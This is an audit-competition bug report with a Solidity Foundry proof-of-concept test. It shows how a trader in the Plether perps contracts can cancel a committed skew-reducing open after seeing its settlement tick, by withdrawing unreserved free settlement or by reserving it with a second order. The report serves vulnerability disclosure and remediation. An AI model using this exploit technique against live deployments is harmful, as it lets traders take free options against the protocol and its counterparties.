# \#99177 [SC-Low] Trader can cancel a committed skew-reducing open after its settlement tick by withdrawing unreserved free settlement

**Submitted on Nov 12th 2026 at 10:04:00 UTC by @kiings91 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99177
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

Plether treats a committed order as binding: users cannot cancel a queued order, and the docs give this as the reason traders cannot turn queued intents into free options. For an open that reduces skew and earns a VPI rebate, the trader can still back out after the order's settlement price is known. The open is partly funded at execution from the account's free settlement, which the commit does not reserve. After seeing the settlement tick and the price that follows, the trader withdraws that free settlement (or ties it up with a second order) and executes its own order. The order fails terminally, the reserved bounty goes back to the trader, and the trader pays nothing. If the trader does nothing, the same order executes.

## Vulnerability Details

All code references are to commit `a82d4fe`; links are under References.

Committing an open reserves the order's margin and the execution bounty, and nothing else (`OrderReservationAccounting`, L108-L146). The rest of the account's settlement balance stays free and withdrawable.

When an open reduces skew, the planner has to back the VPI rebate with a reserve at execution. `_planOpenReserveFunding` takes that reserve from the account's free settlement first and only the remainder from the new position's pledge (`CfdEnginePlanLib`, L545-L579). Whatever comes out of the pledge reduces the position margin, and the initial-margin check then runs on the reduced margin (L425-L436). So a skew-reducing open whose margin is close to the requirement only passes while there is enough free settlement in the account at execution time.

The settlement tick is the first unique Pyth tick published in the 15 seconds after the commit (`PletherOracle`, L87 and L596-L650), and an order can be executed for up to 60 seconds (`OrderExecutionOrchestrator`, L11-L15). Unless a keeper executes first, the trader can see the settlement tick and the ticks after it while the order is still pending. It then has two ways to remove the free settlement the order needs:

1. Withdraw it. `MarginClearinghouse._withdraw` only checks that the remaining equity and balance cover the locked margin (L441-L478). The engine's withdrawal guard only binds when the pending open set a positive `minPostSettlementBalanceAssets` (`CfdEngineSettlementSidecar`, L255-L272). Ordinary orders use a minimum of zero.
2. Commit a second open on the same side with an unreachable limit. Its margin reservation takes the free settlement, the first order hits the same failure, and the second order later fails on its limit at no cost.

When the first order is then executed, the planner returns `INSUFFICIENT_INITIAL_MARGIN`, which the router treats as a terminal `UserInvalid` failure. If the trader executes the order itself, `_settleTerminalBounty` releases the reserved bounty back to the trader (`OrderRouter`, L314-L343). The bounty is at most 0.20 USDG anyway (`OrderRouterBase`, L70-L76).

The result is that the trader decides after the settlement tick whether its committed open executes. If the price that follows favours the order, the trader does nothing and the order executes. If it does not, the trader withdraws and the order is cancelled at no cost.

`SECURITY.md` lists "Users cannot cancel queued orders once committed" as a property (L366), says that binding order semantics and the lack of a user cancellation path "prevent traders from turning queued intents into free options" (L658-L659), repeats "users cannot cancel a queued intent" (L719), and opens the router limitations with "users cannot manually cancel queued intents" (L1345). The whitepaper's softer wording, that binding orders "reduce" the free option (L1137-L1142), is about the queue position, and the same sentence says binding orders "remove user cancellation after an order has entered the queue".

`ACCOUNTING_SPEC.md` (L917-L931) describes an opt-in floor that stops owner withdrawals from manufacturing a settlement-minimum failure, and says "Zero-minimum orders retain ordinary availability". I'm not arguing that free settlement should be frozen for every pending order. The issue is that a skew-reducing open depends on free settlement it never reserved, so an ordinary withdrawal is enough to cancel it. The floor is opt-in, a trader who wants the option leaves it at zero, and it is only supported for a flat account's first pending open.

This is not HIGH-1 (commit after seeing a Pyth price): the PoC asserts that the commit comes before the settlement tick and that the trader acts only after a later tick. It is also not SC-M4 component 3: no LP action or pool-depth change is involved, and the failure is the trader's own `UserInvalid` rejection, not `ProtocolStateInvalidated`.

The trader keeps the choice only until someone else executes the order. A keeper that executes promptly after the settlement tick ends it, and then the trader cannot back out. The trader therefore needs to act before the keeper, for example by withdrawing and executing in one transaction from a smart wallet. Only opens that reduce skew and whose margin sits close to the requirement are affected. The trader chooses its own margin, so this is not a constraint on the attacker: in the PoC it commits 128 USDG for 40,000 USDG of notional, 8 USDG above the smallest margin the open preview accepts, which the release margin settings (20 bps initial margin) allow.

Reserving the projected VPI-reserve funding at commit, or funding that reserve only from the order's own margin and pledge, would close both routes.

## Impact Details

Low: the contract fails to deliver promised returns, but doesn't lose value.

Impact: `SECURITY.md` presents binding orders as a security guarantee, the protection that stops traders from turning queued intents into free options (L366, L658-L659), and for skew-reducing opens that guarantee does not hold. A trader can commit such an open, look at the settlement tick and the price that follows, and cancel the order at zero cost whenever it would rather not trade. The PoC shows the order executing when nobody acts, and failing terminally with zero changes for the trader, the pool and the keeper when the trader withdraws its free settlement, or ties it up with a second order, before executing it. The executed run and the cancelled run branch from the same commit, margin and settlement tick.

Likelihood: any trader can do this with ordinary calls, but only while it acts before the first keeper execution, and only for skew-reducing opens whose margin the trader has set close to the requirement.

I do not claim a loss for LPs or a measured profit for the trader. The PoC shows that the trader, not the queue, decides whether the committed order executes.

## References

Code at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8:
- `OrderReservationAccounting` (commit reserves margin and bounty only): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderReservationAccounting.sol#L108-L146
- `CfdEnginePlanLib._planOpenReserveFunding` (VPI reserve funded from free settlement first): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L545-L579
- `CfdEnginePlanLib` initial-margin check: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L425-L436
- `MarginClearinghouse._withdraw`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/MarginClearinghouse.sol#L441-L478
- `CfdEngineSettlementSidecar.validateWithdraw` (floor only with a positive minimum): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L255-L272
- `OrderRouter._settleTerminalBounty` (bounty back to a self-executor): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L314-L343
- `OrderRouterBase` bounty bounds: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderRouterBase.sol#L70-L76
- `PletherOracle` settlement window and tick selection: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol#L596-L650
- `OrderExecutionOrchestrator` execution window: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderExecutionOrchestrator.sol#L11-L15

Documentation:
- SECURITY.md L366: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L366
- SECURITY.md L658-L659: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L658-L659
- SECURITY.md L719: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L719
- SECURITY.md L1345: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1345
- ACCOUNTING_SPEC.md L917-L931: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L917-L931
- WHITEPAPER.md L1137-L1142: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L1137-L1142

## Proof of Concept

## Proof of Concept

Steps (the trader is an unprivileged account; another account holds a 1,000-lot long, so the trader's 400-lot short reduces skew and earns a VPI rebate):

1. The trader commits the short open with 8 USDG of margin above the smallest margin the open preview accepts. The commit reserves the margin and the 0.20 USDG bounty.
2. The settlement tick (1.00) is published one second after the commit. A later tick (1.002, against the short) is published two seconds after that.
3. In the next block the trader either withdraws its free settlement or commits a second short with an unreachable limit whose margin takes that free settlement.
4. The trader executes its first order with the settlement tick. It fails terminally with `PlannerRejected`, `UserInvalid`, `INSUFFICIENT_INITIAL_MARGIN`. In the second route the trader then executes the second order, which fails on its limit.

The test uses the repository's `BasePerpTest` fixture with the release parameters from `DEPLOYMENT.md` and the deploy script (0.01e18 VPI factor, 10/20 bps maintenance/initial margin, 4 bps execution fee, 1,000 USDG minimum open notional, 25% adverse confidence multiplier, 40M senior cap at 80%) and the contracts' default bounty and window settings. Save the file as `packages/perps/test/poc/CommittedOpenCancel.t.sol` and run from `packages/perps`:

```sh
forge test --match-path test/poc/CommittedOpenCancel.t.sol -vv
```

Results on `a82d4fe` (4 passed, 0 failed):

- Every lever test asserts the order of events: the settlement tick is published after the commit, the later tick after the settlement tick, and the trader acts after the later tick.
- `test_cancelAfterTick_nobodyActsExecutes`: nobody acts and a keeper executes the order at the settlement tick. The order is `Executed`, the trader holds a 400-lot short and the keeper earns 0.20 USDG.
- `test_cancelAfterTick_withdrawFreeSettlement`: from the same commit, the order executes when the trader does nothing. After the trader withdraws its free settlement and executes the order itself, the order is `Failed` with `PlannerRejected`, category `UserInvalid`, code `INSUFFICIENT_INITIAL_MARGIN`. The trader has no position. The trader's balance (account plus wallet), the pool's assets and the keeper's balance are unchanged, and the 0.20 USDG bounty is paid to the trader itself.
- `test_cancelAfterTick_secondOrderReservesSettlement`: the second short leaves less than 1 USDG of free settlement. The first order fails with the same result and the same zero changes. The trader then clears the second order on its limit, and the trader, pool and keeper balances are still unchanged.
- `test_cancelAfterTick_keeperExecutesAfterAction`: if a third-party keeper executes the order after the withdrawal, it fails with the same result and the trader pays exactly the 0.20 USDG bounty to the keeper. The pool's assets are unchanged.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdEnginePlanTypes} from "@plether/perps/CfdEnginePlanTypes.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {Vm} from "forge-std/Vm.sol";

/// @notice A trader commits a skew-reducing open (it earns a VPI rebate). After the order's settlement tick is
///         published, the trader can make its own committed open fail terminally, either by withdrawing free
///         settlement or by committing a second same-side order that reserves it. Self-execution of the failed order
///         returns the reserved bounty, so the cancellation costs nothing.
contract CommittedOpenCancelTest is BasePerpTest {
    address internal constant TRADER = address(0xA11CE);
    address internal constant BOOK_LONG = address(0xB00C);
    address internal constant KEEPER = address(0xCEEB);
    address internal constant LP_SENIOR = address(0x5E01);
    address internal constant LP_JUNIOR = address(0x7001);

    uint256 internal constant LOT = 1e20;
    uint256 internal constant WINDOW = 60;
    uint256 internal constant SLACK = 8e6;
    uint256 internal constant BOOK_LOTS = 1000;
    uint256 internal constant SHORT_LOTS = 400;
    uint256 internal constant FILL_PX = 1e8;
    uint256 internal constant LATER_PX = 1.002e8;

    struct Timeline {
        uint64 orderId;
        uint256 margin;
        uint256 commitTs;
        uint256 fillPublish;
        uint256 laterPublish;
        uint256 actionTs;
    }

    struct Outcome {
        OrderV3Types.LifecycleStatus status;
        OrderV3Types.TerminalReason reason;
        uint8 failureCategory;
        uint8 failureCode;
        OrderV3Types.BountyDisposition disposition;
        uint256 receiptBounty;
        address bountyRecipient;
    }

    struct Balances {
        uint256 trader;
        uint256 keeper;
        uint256 pool;
    }

    // ------------------------------------------------------------------ fixture (release parameters)

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 0.01e18;
        p.maintMarginBps = 10;
        p.initMarginBps = 20;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();

        ICfdEngineAdminHost.EngineRiskConfig memory risk = _engineRiskConfig();
        risk.executionFeeBps = 4;
        _setRiskConfigViaAdmin(risk);

        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.minOpenNotionalAssets = 1000e6;
        rc.adverseConfidenceMultiplierBps = 2500;
        routerAdmin.proposeRouterConfig(rc);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        routerAdmin.finalizeRouterConfig();

        _setSeniorCapacity(40_000_000e6, 8000);
        vm.warp(SETUP_TIMESTAMP + 28 days);

        address[5] memory all_ = [TRADER, BOOK_LONG, KEEPER, LP_SENIOR, LP_JUNIOR];
        for (uint256 i; i < all_.length; ++i) {
            vm.deal(all_[i], 100 ether);
        }
        _installPrice(FILL_PX);

        _seedLp(false, LP_JUNIOR, 500_000e6);
        _seedLp(true, LP_SENIOR, 600_000e6);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _installPrice(FILL_PX);

        address[2] memory traders = [TRADER, BOOK_LONG];
        for (uint256 i; i < traders.length; ++i) {
            settlementToken.mint(traders[i], 300_000e6);
            vm.startPrank(traders[i]);
            settlementToken.approve(address(clearinghouse), type(uint256).max);
            clearinghouse.deposit(traders[i], 300_000e6);
            vm.stopPrank();
        }
        _installPrice(FILL_PX);
    }

    function _setRiskConfigViaAdmin(
        ICfdEngineAdminHost.EngineRiskConfig memory cfg
    ) internal {
        engineAdmin.proposeRiskConfig(cfg);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();
    }

    function _seedLp(
        bool senior,
        address lp,
        uint256 amount
    ) internal {
        TrancheVault v = senior ? seniorVault : juniorVault;
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(v), type(uint256).max);
        uint256 id = v.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        uint256 boundary = ((vm.getBlockTimestamp() / 1 hours) + 2) * 1 hours;
        if (boundary > vm.getBlockTimestamp()) vm.warp(boundary);
        _installPrice(FILL_PX);
        _settleLpEpochForTest();
        uint256 claimable = v.claimableDepositRequest(id, lp);
        vm.prank(lp);
        v.claimDeposit(id, claimable, lp, lp);
    }

    // ------------------------------------------------------------------ oracle / order helpers

    function _freshData(
        uint256 price
    ) internal returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 t = vm.getBlockTimestamp();
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(uint64(price)), 0, int32(-8), t, t - 1);
        data = new bytes[](1);
        data[0] = abi.encode(price);
    }

    function _installPrice(
        uint256 price
    ) internal {
        router.updateMarkPrice{value: 1}(_freshData(price));
    }

    function _req(
        address a,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal view returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = bytes32(uint256(router.nextCommitId()) | (uint256(uint160(a)) << 64));
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = side == CfdTypes.Side.SHORT ? type(uint256).max : 1; // accept any fill price
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + WINDOW),
            executionWindowSeconds: uint32(WINDOW),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    /// @dev Smallest margin for which the commit-time open preview passes (bisection on the engine lens).
    function _minPreviewMargin(
        address a,
        CfdTypes.Side side,
        uint256 lots,
        uint256 px
    ) internal view returns (uint256 lo) {
        uint256 hi = lots * px;
        for (uint256 i; i < 40 && hi - lo > 1; ++i) {
            uint256 mid = (lo + hi) / 2;
            if (engineLens.previewOpenRevertCode(a, side, lots * LOT, mid, px) == 0) hi = mid;
            else lo = mid;
        }
        return hi;
    }

    /// @dev Long book from BOOK_LONG, then the trader's skew-reducing short open (VPI rebate) commits with `SLACK`
    ///      above the minimum margin that passes the commit-time preview. Publishes the fill tick, a later tick that
    ///      moves against the short, and advances to the block in which the trader acts.
    function _commitAndObserveLaterTick() internal returns (Timeline memory t) {
        uint256 px = engine.lastMarkPrice();
        OrderV3Types.OrderRequest memory book =
            _req(BOOK_LONG, CfdTypes.Side.LONG, BOOK_LOTS * LOT, (BOOK_LOTS * px * 300) / 10_000);
        vm.prank(BOOK_LONG);
        uint64 bookId = router.commitOrder(book);
        vm.prank(KEEPER);
        router.executeOrder{value: 1}(bookId, _freshData(px));

        uint256 minMargin = _minPreviewMargin(TRADER, CfdTypes.Side.SHORT, SHORT_LOTS, px);
        t.margin = minMargin + SLACK;
        OrderV3Types.OrderRequest memory open = _req(TRADER, CfdTypes.Side.SHORT, SHORT_LOTS * LOT, t.margin);
        vm.prank(TRADER);
        t.orderId = router.commitOrder(open);
        t.commitTs = vm.getBlockTimestamp();

        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(t.commitTs + 1);
        t.fillPublish = vm.getBlockTimestamp();
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(uint64(FILL_PX)), 0, int32(-8), t.fillPublish, t.commitTs);

        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(t.commitTs + 3);
        t.laterPublish = vm.getBlockTimestamp();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(LATER_PX)), 0, int32(-8), t.laterPublish, t.fillPublish
        );
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(LATER_PX)), 0, int32(-8), t.laterPublish);

        // The trader reads the later tick and acts in the next block.
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(t.commitTs + 4);
        t.actionTs = vm.getBlockTimestamp();

        assertGt(t.fillPublish, t.commitTs, "fill tick published after commit");
        assertGt(t.laterPublish, t.fillPublish, "later tick published after fill tick");
        assertGt(t.actionTs, t.laterPublish, "trader acts after the later tick");
    }

    /// @dev Executes `orderId` with the fill tick (first unique tick after its commit) and decodes its receipt.
    function _execute(
        address executor,
        uint64 orderId,
        uint256 px,
        uint256 publish,
        uint256 prevPublish
    ) internal returns (Outcome memory o) {
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(uint64(px)), 0, int32(-8), publish, prevPublish);
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encode(px);
        vm.recordLogs();
        vm.prank(executor);
        OrderV3Types.ExecutionResult memory res = router.executeOrder{value: 1}(orderId, data);
        o.status = res.status;
        o.reason = res.terminalReason;
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bool found;
        for (uint256 i; i < logs.length; ++i) {
            if (
                logs[i].topics.length == 4 && logs[i].topics[0] == IOrderLifecycleBook.OrderFinalized.selector
                    && uint256(logs[i].topics[1]) == uint256(orderId)
            ) {
                (,,, OrderV3Types.OrderReceipt memory receipt) =
                    abi.decode(logs[i].data, (bytes32, uint64, uint64, OrderV3Types.OrderReceipt));
                o.failureCategory = receipt.failure.category;
                o.failureCode = receipt.failure.code;
                o.disposition = receipt.bountyDisposition;
                o.receiptBounty = receipt.bountyAssets;
                o.bountyRecipient = receipt.bountyRecipient;
                found = true;
            }
        }
        assertTrue(found, "OrderFinalized emitted");
    }

    function _balances() internal view returns (Balances memory b) {
        b.trader = clearinghouse.balanceAssets(TRADER) + settlementToken.balanceOf(TRADER);
        b.keeper = clearinghouse.balanceAssets(KEEPER);
        b.pool = pool.totalAssets();
    }

    function _positionSize(
        address a
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(a);
    }

    function _delta(
        uint256 a,
        uint256 b
    ) internal pure returns (int256) {
        return int256(a) - int256(b);
    }

    function _assertTerminalUserInvalid(
        Outcome memory o
    ) internal pure {
        assertEq(uint8(o.status), uint8(OrderV3Types.LifecycleStatus.Failed), "terminal status");
        assertEq(uint8(o.reason), uint8(OrderV3Types.TerminalReason.PlannerRejected), "PlannerRejected");
        assertEq(
            o.failureCategory,
            uint8(CfdEnginePlanTypes.ExecutionFailurePolicyCategory.UserInvalid),
            "failure category UserInvalid"
        );
        assertEq(
            o.failureCode,
            uint8(CfdEnginePlanTypes.OpenRevertCode.INSUFFICIENT_INITIAL_MARGIN),
            "failure code INSUFFICIENT_INITIAL_MARGIN"
        );
    }

    // ------------------------------------------------------------------ tests

    function test_cancelAfterTick_nobodyActsExecutes() external {
        Timeline memory t = _commitAndObserveLaterTick();
        Balances memory pre = _balances();
        Outcome memory o = _execute(KEEPER, t.orderId, FILL_PX, t.fillPublish, t.commitTs);

        assertEq(uint8(o.status), uint8(OrderV3Types.LifecycleStatus.Executed), "executed");
        assertEq(_positionSize(TRADER), SHORT_LOTS * LOT, "position size == order size");
        assertEq(engine.lastMarkPrice(), FILL_PX, "filled at the fill tick, not the later tick");
        assertEq(_delta(_balances().keeper, pre.keeper), 200_000, "keeper earns the bounty");
        assertEq(uint8(o.disposition), uint8(OrderV3Types.BountyDisposition.Paid), "bounty paid");
    }

    function test_cancelAfterTick_withdrawFreeSettlement() external {
        Timeline memory t = _commitAndObserveLaterTick();
        Balances memory pre = _balances();
        assertEq(clearinghouse.totalBountyReservationsAssets(TRADER), 200_000, "bounty reserved at commit");

        // Same commit, same slack: without action the order executes.
        uint256 snap = vm.snapshotState();
        Outcome memory control = _execute(KEEPER, t.orderId, FILL_PX, t.fillPublish, t.commitTs);
        assertEq(uint8(control.status), uint8(OrderV3Types.LifecycleStatus.Executed), "control executes");
        vm.revertToState(snap);

        uint256 free = clearinghouse.getFreeBuyingPowerAssets(TRADER);
        vm.prank(TRADER);
        clearinghouse.withdrawMargin(free);
        assertGt(free, 0, "free settlement withdrawn");
        assertEq(settlementToken.balanceOf(TRADER), free, "withdrawn amount sits in the wallet");

        Outcome memory o = _execute(TRADER, t.orderId, FILL_PX, t.fillPublish, t.commitTs);
        Balances memory post = _balances();

        _assertTerminalUserInvalid(o);
        assertEq(_positionSize(TRADER), 0, "no position");
        assertEq(_delta(post.trader, pre.trader), 0, "trader pays nothing");
        assertEq(_delta(post.pool, pre.pool), 0, "pool assets unchanged");
        assertEq(_delta(post.keeper, pre.keeper), 0, "keeper receives nothing");
        assertEq(o.bountyRecipient, TRADER, "bounty paid to the trader itself");
        assertEq(o.receiptBounty, 200_000, "receipt bounty");
    }

    function test_cancelAfterTick_secondOrderReservesSettlement() external {
        Timeline memory t = _commitAndObserveLaterTick();
        Balances memory pre = _balances();

        uint256 free = clearinghouse.getFreeBuyingPowerAssets(TRADER);
        // Leave room for the second order's own bounty.
        OrderV3Types.OrderRequest memory second = _req(TRADER, CfdTypes.Side.SHORT, 20 * LOT, free - 1e6);
        second.targetPrice = 1; // unreachable short limit: the order can only clear by limit
        vm.prank(TRADER);
        uint64 secondId = router.commitOrder(second);
        assertGt(secondId, t.orderId, "second order queues behind the first");
        assertLt(clearinghouse.getFreeBuyingPowerAssets(TRADER), 1e6, "free settlement is now reserved");

        Outcome memory o = _execute(TRADER, t.orderId, FILL_PX, t.fillPublish, t.commitTs);
        Balances memory mid = _balances();

        _assertTerminalUserInvalid(o);
        assertEq(_positionSize(TRADER), 0, "no position");
        assertEq(_delta(mid.trader, pre.trader), 0, "first order: trader delta 0");
        assertEq(_delta(mid.pool, pre.pool), 0, "first order: pool delta 0");
        assertEq(_delta(mid.keeper, pre.keeper), 0, "first order: keeper delta 0");
        assertEq(o.bountyRecipient, TRADER, "bounty paid to the trader itself");
        assertEq(o.receiptBounty, 200_000, "receipt bounty");

        // The second order cannot fill (unreachable limit); the trader clears it itself.
        vm.warp(t.actionTs + 1);
        Outcome memory cleanup = _execute(TRADER, secondId, LATER_PX, vm.getBlockTimestamp(), t.actionTs);
        Balances memory post = _balances();
        assertEq(uint8(cleanup.reason), uint8(OrderV3Types.TerminalReason.Slippage), "second order clears by limit");
        assertEq(_positionSize(TRADER), 0, "still no position");
        assertEq(_delta(post.trader, pre.trader), 0, "second order cleanup costs 0");
        assertEq(_delta(post.pool, pre.pool), 0, "pool delta 0 after cleanup");
        assertEq(_delta(post.keeper, pre.keeper), 0, "keeper delta 0 after cleanup");
        assertEq(cleanup.bountyRecipient, TRADER, "second bounty paid to the trader itself");
    }

    function test_cancelAfterTick_keeperExecutesAfterAction() external {
        Timeline memory t = _commitAndObserveLaterTick();
        Balances memory pre = _balances();

        uint256 free = clearinghouse.getFreeBuyingPowerAssets(TRADER);
        vm.prank(TRADER);
        clearinghouse.withdrawMargin(free);
        assertGt(free, 0, "free settlement withdrawn");

        Outcome memory o = _execute(KEEPER, t.orderId, FILL_PX, t.fillPublish, t.commitTs);
        Balances memory post = _balances();

        _assertTerminalUserInvalid(o);
        assertEq(_positionSize(TRADER), 0, "no position");
        assertEq(_delta(post.trader, pre.trader), -200_000, "trader pays exactly the bounty");
        assertEq(_delta(post.keeper, pre.keeper), 200_000, "keeper receives exactly the bounty");
        assertEq(_delta(post.pool, pre.pool), 0, "pool assets unchanged");
        assertEq(uint8(o.disposition), uint8(OrderV3Types.BountyDisposition.Paid), "bounty paid");
        assertEq(o.bountyRecipient, KEEPER, "bounty recipient is the keeper");
        assertEq(o.receiptBounty, 200_000, "receipt bounty");
    }
}
```
